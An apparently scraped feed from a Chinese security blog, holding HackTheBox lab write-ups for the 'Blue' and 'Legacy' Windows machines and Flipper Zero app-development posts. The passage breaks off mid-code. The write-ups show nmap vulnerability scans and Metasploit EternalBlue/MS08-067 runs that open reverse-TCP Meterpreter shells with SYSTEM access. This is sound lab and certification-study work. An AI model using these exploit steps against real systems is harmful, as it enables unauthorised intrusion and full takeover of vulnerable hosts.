class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line">└──╼ [★]$ msfconsole</span><br><span class="line">Metasploit tip: The use <span class="built_in">command</span> supports fuzzy searching to try and </span><br><span class="line"><span class="keyword">select</span> the intended module, e.g. use kerberos/get_ticket or use </span><br><span class="line">kerberos forge silver ticket</span><br><span class="line">                                                  </span><br><span class="line">%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%</span><br><span class="line">%%     %%%         %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%</span><br><span class="line">%%  %%  %%%%%%%%   %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%</span><br><span class="line">%%  %  %%%%%%%%   %%%%%%%%%%% https://metasploit.com %%%%%%%%%%%%%%%%%%%%%%%%</span><br><span class="line">%%  %%  %%%%%%   %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%</span><br><span class="line">%%  %%%%%%%%%   %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%</span><br><span class="line">%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%</span><br><span class="line">%%%%%  %%%  %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%</span><br><span class="line">%%%%    %%   %%%%%%%%%%%  %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%  %%%  %%%%%</span><br><span class="line">%%%%  %%  %%  %      %%      %%    %%%%%      %    %%%%  %%   %%%%%%       %%</span><br><span class="line">%%%%  %%  %%  %  %%% %%%%  %%%%  %%  %%%%  %%%%  %% %%  %% %%% %%  %%%  %%%%%</span><br><span class="line">%%%%  %%%%%%  %%   %%%%%%   %%%%  %%%  %%%%  %%    %%  %%% %%% %%   %%  %%%%%</span><br><span class="line">%%%%%%%%%%%% %%%%     %%%%%    %%  %%   %    %%  %%%%  %%%%   %%%   %%%     %</span><br><span class="line">%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%  %%%%%%% %%%%%%%%%%%%%%</span><br><span class="line">%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%          %%%%%%%%%%%%%%</span><br><span class="line">%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">       =[ metasploit v6.3.44-dev                          ]</span><br><span class="line">+ -- --=[ 2376 exploits - 1232 auxiliary - 416 post       ]</span><br><span class="line">+ -- --=[ 1391 payloads - 46 encoders - 11 nops           ]</span><br><span class="line">+ -- --=[ 9 evasion                                       ]</span><br><span class="line"></span><br><span class="line">Metasploit Documentation: https://docs.metasploit.com/</span><br><span class="line"></span><br><span class="line">[msf](Jobs:0 Agents:0) &gt;&gt; search CVE-2017-0143</span><br><span class="line"></span><br><span class="line">Matching Modules</span><br><span class="line">================</span><br><span class="line"></span><br><span class="line">   <span class="comment">#  Name                                      Disclosure Date  Rank     Check  Description</span></span><br><span class="line">   -  ----                                      ---------------  ----     -----  -----------</span><br><span class="line">   0  exploit/windows/smb/ms17_010_eternalblue  2017-03-14       average  Yes    MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption</span><br><span class="line">   1  exploit/windows/smb/ms17_010_psexec       2017-03-14       normal   Yes    MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Code Execution</span><br><span class="line">   2  auxiliary/admin/smb/ms17_010_command      2017-03-14       normal   No     MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Command Execution</span><br><span class="line">   3  auxiliary/scanner/smb/smb_ms17_010                         normal   No     MS17-010 SMB RCE Detection</span><br><span class="line">   4  exploit/windows/smb/smb_doublepulsar_rce  2017-04-14       great    Yes    SMB DOUBLEPULSAR Remote Code Execution</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Interact with a module by name or index. For example info 4, use 4 or use exploit/windows/smb/smb_doublepulsar_rce</span><br><span class="line"></span><br><span class="line">[msf](Jobs:0 Agents:0) &gt;&gt; use 1 </span><br><span class="line">[*] No payload configured, defaulting to windows/meterpreter/reverse_tcp</span><br><span class="line">[msf](Jobs:0 Agents:0) exploit(windows/smb/ms17_010_psexec) &gt;&gt; <span class="built_in">set</span> lhost tun0</span><br><span class="line">lhost =&gt; tun0</span><br><span class="line">[msf](Jobs:0 Agents:0) exploit(windows/smb/ms17_010_psexec) &gt;&gt; <span class="built_in">set</span> rhost 10.129.208.2</span><br><span class="line">rhost =&gt; 10.129.208.2</span><br><span class="line">[msf](Jobs:0 Agents:0) exploit(windows/smb/ms17_010_psexec) &gt;&gt; run</span><br><span class="line"></span><br><span class="line">[*] Started reverse TCP handler on 10.10.14.30:4444 </span><br><span class="line">[*] 10.129.208.2:445 - Target OS: Windows 7 Professional 7601 Service Pack 1</span><br><span class="line">[*] 10.129.208.2:445 - Built a write-what-where primitive...</span><br><span class="line">[+] 10.129.208.2:445 - Overwrite complete... SYSTEM session obtained!</span><br><span class="line">[*] 10.129.208.2:445 - Selecting PowerShell target</span><br><span class="line">[*] 10.129.208.2:445 - Executing the payload...</span><br><span class="line">[+] 10.129.208.2:445 - Service start timed out, OK <span class="keyword">if</span> running a <span class="built_in">command</span> or non-service executable...</span><br><span class="line">[*] Sending stage (175686 bytes) to 10.129.208.2</span><br><span class="line">[*] Meterpreter session 1 opened (10.10.14.30:4444 -&gt; 10.129.208.2:49158) at 2024-10-27 06:13:43 -0500</span><br><span class="line"></span><br><span class="line">(Meterpreter 1)(C:\Windows\system32) &gt; getuid</span><br><span class="line">Server username: NT AUTHORITY\SYSTEM</span><br></pre></td></tr></table></figure></div><p>拿下 root。</p><h4 id="Pwned"><a href="#Pwned" class="headerlink" title="Pwned !!!"></a>Pwned !!!</h4><p><img                       lazyload                     src="/images/loading.svg"                     data-src="/../images/blue_pwn.png"                      alt="pwn"                ></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;Recon&quot;&gt;&lt;a href=&quot;#Recon&quot; class=&quot;headerlink&quot; title=&quot;Recon&quot;&gt;&lt;/a&gt;Recon&lt;/h2&gt;&lt;p&gt;先 &lt;code&gt;nmap&lt;/code&gt; 一下：&lt;/p&gt;
&lt;div class=&quot;highlight-containe</summary>
      
    
    
    
    
    <category term="writeup" scheme="https://kazma.tw/tags/writeup/"/>
    
    <category term="htb" scheme="https://kazma.tw/tags/htb/"/>
    
    <category term="machines" scheme="https://kazma.tw/tags/machines/"/>
    
    <category term="pt" scheme="https://kazma.tw/tags/pt/"/>
    
    <category term="windows" scheme="https://kazma.tw/tags/windows/"/>
    
  </entry>
  
  <entry>
    <title>HackTheBox-Machines Legacy Writeup</title>
    <link href="https://kazma.tw/2024/10/27/HackTheBox-Machines-Legacy-Writeup/"/>
    <id>https://kazma.tw/2024/10/27/HackTheBox-Machines-Legacy-Writeup/</id>
    <published>2024-10-27T09:38:00.249Z</published>
    <updated>2024-10-27T11:10:12.335Z</updated>
    
    <content type="html"><![CDATA[<p>從今天開始想要在考 OSCP 前刷一下 HackTheBox 中跟 OSCP 證照比較相關的機器：<br><a class="link"   href="https://github.com/rkhal101/Hack-the-Box-OSCP-Preparation" >https://github.com/rkhal101/Hack-the-Box-OSCP-Preparation <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a><br>今天要打的是 Windows 的 legacy</p><p>先 <code>nmap</code> 掃一下</p><ul><li><code>-sV</code> 是服務版本偵測</li><li><code>--script=vuln</code> 會針對已知漏洞進行檢查<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">└──╼ [★]$ nmap -sV --script=vuln 10.129.152.110</span><br><span class="line">Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-10-27 05:21 CDT</span><br><span class="line">Nmap scan report <span class="keyword">for</span> 10.129.152.110</span><br><span class="line">Host is up (0.078s latency).</span><br><span class="line">Not shown: 997 closed tcp ports (reset)</span><br><span class="line">PORT    STATE SERVICE      VERSION</span><br><span class="line">135/tcp open  msrpc        Microsoft Windows RPC</span><br><span class="line">139/tcp open  netbios-ssn  Microsoft Windows netbios-ssn</span><br><span class="line">445/tcp open  microsoft-ds Microsoft Windows XP microsoft-ds</span><br><span class="line">Service Info: OSs: Windows, Windows XP; CPE: cpe:/o:microsoft:windows, cpe:/o:microsoft:windows_xp</span><br><span class="line"></span><br><span class="line">Host script results:</span><br><span class="line">|_smb-vuln-ms10-054: <span class="literal">false</span></span><br><span class="line">| smb-vuln-ms17-010: </span><br><span class="line">|   VULNERABLE:</span><br><span class="line">|   Remote Code Execution vulnerability <span class="keyword">in</span> Microsoft SMBv1 servers (ms17-010)</span><br><span class="line">|     State: VULNERABLE</span><br><span class="line">|     IDs:  CVE:CVE-2017-0143</span><br><span class="line">|     Risk <span class="built_in">factor</span>: HIGH</span><br><span class="line">|       A critical remote code execution vulnerability exists <span class="keyword">in</span> Microsoft SMBv1</span><br><span class="line">|        servers (ms17-010).</span><br><span class="line">|           </span><br><span class="line">|     Disclosure <span class="built_in">date</span>: 2017-03-14</span><br><span class="line">|     References:</span><br><span class="line">|       https://blogs.technet.microsoft.com/msrc/2017/05/12/customer-guidance-for-wannacrypt-attacks/</span><br><span class="line">|       https://technet.microsoft.com/en-us/library/security/ms17-010.aspx</span><br><span class="line">|_      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0143</span><br><span class="line">|_smb-vuln-ms10-061: ERROR: Script execution failed (use -d to debug)</span><br><span class="line">|_samba-vuln-cve-2012-1182: NT_STATUS_ACCESS_DENIED</span><br><span class="line"></span><br><span class="line">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap <span class="keyword">done</span>: 1 IP address (1 host up) scanned <span class="keyword">in</span> 23.14 seconds</span><br></pre></td></tr></table></figure></div>掃描結果是有三個服務開啟，其中有 smb-vuln-ms17-010 的漏洞，是一個 SMB 的 RCE 洞，我們可以用 msfconsole 扁他。<br>結果一直遇到這個問題：<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><figcaption><span>Agents:0) exploit(windows/smb/ms17_010_psexec) >> exploit</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">[*] Started reverse TCP handler on 10.10.14.30:4444 </span><br><span class="line">[*] 10.129.152.110:445 - Target OS: Windows 5.1</span><br><span class="line">[-] 10.129.152.110:445 - Unable to find accessible named pipe!</span><br><span class="line">^[c[*] Exploit completed, but no session was created.1</span><br></pre></td></tr></table></figure></div>超怪，網路上看到有人用這個洞打進去，但是看到有些人是打 netbios 的洞，而且他們用 <code>nmap</code> 用一樣的指令有掃到 CVE-2008-4250 超怪。<br>結果機器重開之後就有了？？？<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line">└──╼ [★]$ nmap --script vuln 10.129.227.181</span><br><span class="line">Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-10-27 05:52 CDT</span><br><span class="line">Nmap scan report <span class="keyword">for</span> 10.129.227.181</span><br><span class="line">Host is up (0.077s latency).</span><br><span class="line">Not shown: 997 closed tcp ports (reset)</span><br><span class="line">PORT    STATE SERVICE</span><br><span class="line">135/tcp open  msrpc</span><br><span class="line">139/tcp open  netbios-ssn</span><br><span class="line">445/tcp open  microsoft-ds</span><br><span class="line"></span><br><span class="line">Host script results:</span><br><span class="line">| smb-vuln-ms08-067: </span><br><span class="line">|   VULNERABLE:</span><br><span class="line">|   Microsoft Windows system vulnerable to remote code execution (MS08-067)</span><br><span class="line">|     State: VULNERABLE</span><br><span class="line">|     IDs:  CVE:CVE-2008-4250</span><br><span class="line">|           The Server service <span class="keyword">in</span> Microsoft Windows 2000 SP4, XP SP2 and SP3, Server 2003 SP1 and SP2,</span><br><span class="line">|           Vista Gold and SP1, Server 2008, and 7 Pre-Beta allows remote attackers to execute arbitrary</span><br><span class="line">|           code via a crafted RPC request that triggers the overflow during path canonicalization.</span><br><span class="line">|           </span><br><span class="line">|     Disclosure <span class="built_in">date</span>: 2008-10-23</span><br><span class="line">|     References:</span><br><span class="line">|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2008-4250</span><br><span class="line">|_      https://technet.microsoft.com/en-us/library/security/ms08-067.aspx</span><br><span class="line">|_smb-vuln-ms10-054: <span class="literal">false</span></span><br><span class="line">|_smb-vuln-ms10-061: ERROR: Script execution failed (use -d to debug)</span><br><span class="line">|_samba-vuln-cve-2012-1182: NT_STATUS_ACCESS_DENIED</span><br><span class="line">| smb-vuln-ms17-010: </span><br><span class="line">|   VULNERABLE:</span><br><span class="line">|   Remote Code Execution vulnerability <span class="keyword">in</span> Microsoft SMBv1 servers (ms17-010)</span><br><span class="line">|     State: VULNERABLE</span><br><span class="line">|     IDs:  CVE:CVE-2017-0143</span><br><span class="line">|     Risk <span class="built_in">factor</span>: HIGH</span><br><span class="line">|       A critical remote code execution vulnerability exists <span class="keyword">in</span> Microsoft SMBv1</span><br><span class="line">|        servers (ms17-010).</span><br><span class="line">|           </span><br><span class="line">|     Disclosure <span class="built_in">date</span>: 2017-03-14</span><br><span class="line">|     References:</span><br><span class="line">|       https://blogs.technet.microsoft.com/msrc/2017/05/12/customer-guidance-for-wannacrypt-attacks/</span><br><span class="line">|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0143</span><br><span class="line">|_      https://technet.microsoft.com/en-us/library/security/ms17-010.aspx</span><br><span class="line"></span><br><span class="line">Nmap <span class="keyword">done</span>: 1 IP address (1 host up) scanned <span class="keyword">in</span> 28.00 seconds</span><br></pre></td></tr></table></figure></div>超蠢結果機器重開就有了：<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line">└──╼ [★]$ msfconsole</span><br><span class="line">Metasploit tip: Use the edit <span class="built_in">command</span> to open the currently active module </span><br><span class="line"><span class="keyword">in</span> your editor</span><br><span class="line">                                                  </span><br><span class="line">     ,           ,</span><br><span class="line">    /             \</span><br><span class="line">   ((__---,,,---__))</span><br><span class="line">      (_) O O (_)_________</span><br><span class="line">         \ _ /            |\</span><br><span class="line">          o_o \   M S F   | \</span><br><span class="line">               \   _____  |  *</span><br><span class="line">                |||   WW|||</span><br><span class="line">                |||     |||</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">       =[ metasploit v6.3.44-dev                          ]</span><br><span class="line">+ -- --=[ 2376 exploits - 1232 auxiliary - 416 post       ]</span><br><span class="line">+ -- --=[ 1391 payloads - 46 encoders - 11 nops           ]</span><br><span class="line">+ -- --=[ 9 evasion                                       ]</span><br><span class="line"></span><br><span class="line">Metasploit Documentation: https://docs.metasploit.com/</span><br><span class="line"></span><br><span class="line">[msf](Jobs:0 Agents:0) &gt;&gt; search CVE-2008-4250</span><br><span class="line"></span><br><span class="line">Matching Modules</span><br><span class="line">================</span><br><span class="line"></span><br><span class="line">   <span class="comment">#  Name                                 Disclosure Date  Rank   Check  Description</span></span><br><span class="line">   -  ----                                 ---------------  ----   -----  -----------</span><br><span class="line">   0  exploit/windows/smb/ms08_067_netapi  2008-10-28       great  Yes    MS08-067 Microsoft Server Service Relative Path Stack Corruption</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Interact with a module by name or index. For example info 0, use 0 or use exploit/windows/smb/ms08_067_netapi</span><br><span class="line"></span><br><span class="line">[msf](Jobs:0 Agents:0) &gt;&gt; use 0</span><br><span class="line">[*] No payload configured, defaulting to windows/meterpreter/reverse_tcp</span><br><span class="line">[msf](Jobs:0 Agents:0) exploit(windows/smb/ms08_067_netapi) &gt;&gt; <span class="built_in">set</span> lhost tun0</span><br><span class="line">lhost =&gt; tun0</span><br><span class="line">[msf](Jobs:0 Agents:0) exploit(windows/smb/ms08_067_netapi) &gt;&gt; <span class="built_in">set</span> rhost 10.129.227.181</span><br><span class="line">rhost =&gt; 10.129.227.181</span><br><span class="line">[msf](Jobs:0 Agents:0) exploit(windows/smb/ms08_067_netapi) &gt;&gt; run</span><br><span class="line"></span><br><span class="line">[*] Started reverse TCP handler on 10.10.14.30:4444 </span><br><span class="line">[*] 10.129.227.181:445 - Automatically detecting the target...</span><br><span class="line">[*] 10.129.227.181:445 - Fingerprint: Windows XP - Service Pack 3 - lang:English</span><br><span class="line">[*] 10.129.227.181:445 - Selected Target: Windows XP SP3 English (AlwaysOn NX)</span><br><span class="line">[*] 10.129.227.181:445 - Attempting to trigger the vulnerability...</span><br><span class="line">[*] Sending stage (175686 bytes) to 10.129.227.181</span><br><span class="line">[*] Meterpreter session 1 opened (10.10.14.30:4444 -&gt; 10.129.227.181:1039) at 2024-10-27 05:55:37 -0500</span><br><span class="line"></span><br><span class="line">(Meterpreter 1)(C:\WINDOWS\system32) &gt; <span class="built_in">id</span> </span><br><span class="line">[-] Unknown <span class="built_in">command</span>: <span class="built_in">id</span></span><br><span class="line">(Meterpreter 1)(C:\WINDOWS\system32) &gt; getuid</span><br><span class="line">Server username: NT AUTHORITY\SYSTEM</span><br></pre></td></tr></table></figure></div></li></ul><h4 id="Pwned"><a href="#Pwned" class="headerlink" title="Pwned !!!"></a>Pwned !!!</h4><p><img                       lazyload                     src="/images/loading.svg"                     data-src="/../images/legacy_pwn.png"                      alt="pwn"                ></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;從今天開始想要在考 OSCP 前刷一下 HackTheBox 中跟 OSCP 證照比較相關的機器：&lt;br&gt;&lt;a class=&quot;link&quot;   href=&quot;https://github.com/rkhal101/Hack-the-Box-OSCP-Preparation&quot; &gt;</summary>
      
    
    
    
    
    <category term="writeup" scheme="https://kazma.tw/tags/writeup/"/>
    
    <category term="htb" scheme="https://kazma.tw/tags/htb/"/>
    
    <category term="machines" scheme="https://kazma.tw/tags/machines/"/>
    
    <category term="pt" scheme="https://kazma.tw/tags/pt/"/>
    
    <category term="windows" scheme="https://kazma.tw/tags/windows/"/>
    
  </entry>
  
  <entry>
    <title>Flipper Zero 宇宙最強攻略：30 天帶你從入門到入坑 Day30 - 未完待續！撲朔迷離的十一月預告信？</title>
    <link href="https://kazma.tw/2024/10/14/Flipper-Zero-%E5%AE%87%E5%AE%99%E6%9C%80%E5%BC%B7%E6%94%BB%E7%95%A5%EF%BC%9A30-%E5%A4%A9%E5%B8%B6%E4%BD%A0%E5%BE%9E%E5%85%A5%E9%96%80%E5%88%B0%E5%85%A5%E5%9D%91-Day30/"/>
    <id>https://kazma.tw/2024/10/14/Flipper-Zero-%E5%AE%87%E5%AE%99%E6%9C%80%E5%BC%B7%E6%94%BB%E7%95%A5%EF%BC%9A30-%E5%A4%A9%E5%B8%B6%E4%BD%A0%E5%BE%9E%E5%85%A5%E9%96%80%E5%88%B0%E5%85%A5%E5%9D%91-Day30/</id>
    <published>2024-10-14T07:13:51.887Z</published>
    <updated>2024-10-29T03:22:04.373Z</updated>
    
    <content type="html"><![CDATA[<h2 id="健身海豚教練"><a href="#健身海豚教練" class="headerlink" title="健身海豚教練"></a>健身海豚教練</h2><p>估計是做不完了XD<br>所以簡單說一下之後預計要怎麼完成：<br>首先是功能的部分，我希望可以透過事前輸入課表，包括次數、組數、組間休息時間、然後每次去健身的時候就可以開始課表，然後他會告訴我現在要做的動作名稱，次數和組數，然後我做完之後按下 Finish 就可以開始倒數組間休，時間倒數完就會跳一個 popup 五秒後消失，叫我們趕快做下一組然後做完再按 Finish 如此重複。<br>然後可以儲存不同的課表，之後我們可以從已儲存的列表選擇今天要訓練的項目。</p><h2 id="心得"><a href="#心得" class="headerlink" title="心得"></a>心得</h2><p>終於到了挑戰的最後一天，來講一些關於挑戰的心得。<br>很感謝這個挑戰讓我可以養成每天學習一個新技術的習慣，基本上每天都是到了晚上 21. 就開始要準備撰寫當天的文章，然後幾乎都在截止前十分鐘送出，取名字的部分也是花了點心思，因為本身覺得取名字是一門藝術。最後確實也發掘了不少有趣的 Flipper Zero 功能，雖然自己預期能夠寫出更有技術深度的文章，甚至最後一天預計是要完整開發一個應用程式的，但這個月的行程真的是太爆炸緊湊了。<br>這個挑戰結束後，也預計每天花固定的時間進行同一個研究或是閱讀手邊的書籍，希望明天可以跟牛肉湯的夥伴們組隊拿下一些獎項。</p><h2 id="預告信"><a href="#預告信" class="headerlink" title="預告信"></a>預告信</h2><p>今年十一月份的時候，你們還會回到這裡來的～<br>我們到時候見！<br><img                       lazyload                     src="/images/loading.svg"                     data-src="/../images/letter.png"                      alt="letter"                ></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;健身海豚教練&quot;&gt;&lt;a href=&quot;#健身海豚教練&quot; class=&quot;headerlink&quot; title=&quot;健身海豚教練&quot;&gt;&lt;/a&gt;健身海豚教練&lt;/h2&gt;&lt;p&gt;估計是做不完了XD&lt;br&gt;所以簡單說一下之後預計要怎麼完成：&lt;br&gt;首先是功能的部分，我希望可以透過事前輸入</summary>
      
    
    
    
    
    <category term="flipper-zero" scheme="https://kazma.tw/tags/flipper-zero/"/>
    
    <category term="iThome" scheme="https://kazma.tw/tags/iThome/"/>
    
    <category term="toy" scheme="https://kazma.tw/tags/toy/"/>
    
  </entry>
  
  <entry>
    <title>Flipper Zero 宇宙最強攻略：30 天帶你從入門到入坑 Day29 - 絶対的な優位を掌握せよ！倒数24時間、登場する圧軸必殺技！</title>
    <link href="https://kazma.tw/2024/10/13/Flipper-Zero-%E5%AE%87%E5%AE%99%E6%9C%80%E5%BC%B7%E6%94%BB%E7%95%A5%EF%BC%9A30-%E5%A4%A9%E5%B8%B6%E4%BD%A0%E5%BE%9E%E5%85%A5%E9%96%80%E5%88%B0%E5%85%A5%E5%9D%91-Day29/"/>
    <id>https://kazma.tw/2024/10/13/Flipper-Zero-%E5%AE%87%E5%AE%99%E6%9C%80%E5%BC%B7%E6%94%BB%E7%95%A5%EF%BC%9A30-%E5%A4%A9%E5%B8%B6%E4%BD%A0%E5%BE%9E%E5%85%A5%E9%96%80%E5%88%B0%E5%85%A5%E5%9D%91-Day29/</id>
    <published>2024-10-13T10:49:19.296Z</published>
    <updated>2024-10-27T09:35:25.861Z</updated>
    
    <content type="html"><![CDATA[<h2 id="Cover"><a href="#Cover" class="headerlink" title="Cover"></a>Cover</h2><p><img                       lazyload                     src="/images/loading.svg"                     data-src="/../images/popup_demo.png"                      alt="popup_demo"                ><br>圖片來源：<a class="link"   href="https://instantiator.dev/post/flipper-zero-app-tutorial-02/" >https://instantiator.dev/post/flipper-zero-app-tutorial-02/ <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p><h2 id="資安倫理宣導"><a href="#資安倫理宣導" class="headerlink" title="資安倫理宣導"></a>資安倫理宣導</h2><p>請注意，透過 Flipper Zero 學習的資訊技術與知識，目的在於提升個人的技術能力和資安意識。我們強烈呼籲大家，絕對不要使用所學知識從事任何違法行為。您的合法使用是我們的期望，也是您自身責任的<br>一部分。</p><h2 id="定義場景功能的核心步驟"><a href="#定義場景功能的核心步驟" class="headerlink" title="定義場景功能的核心步驟"></a>定義場景功能的核心步驟</h2><p>當我們在開發 Flipper Zero 應用程式時，每個場景都有三個關鍵函式，這些函式主要是負責管理進入場景時的資源、處理事件以及離開場景時釋放資源，如下：</p><ol><li>**<code>*_on_enter</code>**：當進入場景時初始化視圖及資源。</li><li>**<code>*_on_event</code>**：處理使用者輸入和自定義事件。</li><li>**<code>*_on_exit</code>**：離開場景時，釋放佔用的資源。</li></ol><h3 id="設定主選單的回傳函式"><a href="#設定主選單的回傳函式" class="headerlink" title="設定主選單的回傳函式"></a>設定主選單的回傳函式</h3><p>在主選單的場景中，我們會定義一個回傳函式 <code>test_app_menu_callback_main_menu</code>。這個回傳函式會接收到使用者的選擇，這個選擇值來自於 <code>TestAppMenuSelection</code>。透過這個值，我們可以確認使用者選擇了哪一個選項，並將此選擇發送到場景管理器的自定義事件處理函式。這樣做的好處是將事件傳遞給場景管理器，而不是在選單回傳函式中處理事件，能夠確保每個場景都能處理自己的邏輯，提升整體的可讀性和維護性。</p><h3 id="進入主選單場景"><a href="#進入主選單場景" class="headerlink" title="進入主選單場景"></a>進入主選單場景</h3><p>當我們進入主選單場景時，會調用 <code>test_app_scene_on_enter_main_menu</code> 函式來設定場景。這裡的工作是初始化該場景所需要的資源，並指示視圖調度器切換到對應的視圖。步驟如下：</p><ol><li><p><strong>重設選單視圖</strong>：</p><div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">menu_reset(app-&gt;menu);</span><br></pre></td></tr></table></figure></div><p>這行程式碼會重置選單，確保我們開始時的選單是乾淨的，不包含任何之前添加的項目。</p></li><li><p><strong>添加選單項目</strong>：<br>每個選單項目都會用來表示一個選擇，並且會指派一個來自 <code>TestAppMenuSelection</code> 的 ID。這個 ID 在選單回呼函式中用來確認使用者做出的選擇。例如：</p><div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span 